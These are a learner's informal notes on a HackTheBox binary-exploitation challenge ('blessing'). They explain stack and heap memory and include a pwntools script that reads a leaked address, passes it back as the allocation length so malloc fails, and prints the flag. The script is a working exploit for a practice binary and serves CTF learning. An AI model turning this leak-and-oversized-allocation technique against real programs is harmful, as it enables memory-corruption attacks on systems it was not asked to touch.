**Category**  
**Link** : [Rompiendo un Programa Desde Dentro](https://www.youtube.com/watch?v=DccTNyF0svY
## Memory
Stack -> small variables, temporary
Heap -> Dynamic memory/Ask 4 memory
(code-libraries)
0x0 = null
Long writes 8 bytes

```C
char *p = malloc(100)
0x555555555559260 -> byte 1
0x555555555559261 -> byte 2

p = malloc(99999999999) -> 0
....
```
## Steps

```C
// the code reads song_length
song_addr = malloc(song_length)
// later

```

Install pwntools
```Python
from pwn import *

#p = remote("12.23.23", port)
p = process("./blessing")
p.recvuntil(b"this: ")
# man ascii
# \b backspace = 08 in HEX
addr_leak = int(p.recvuntil(b"\x08")[:-1].decode(), 16)
info(f"Leak Addr: {hex(addr_leak)} -> {addr_leak}")

p.sendlineafter(b"length :", str(addr_leak).encode())
p.sendlineafter(b"song: ", b"prueba")

flag_content = p.recvline()
print(flag_content.decode())
```
this retunrs 14050.....
## Notes

#hacking #hackthebox #ghidra #cmemory
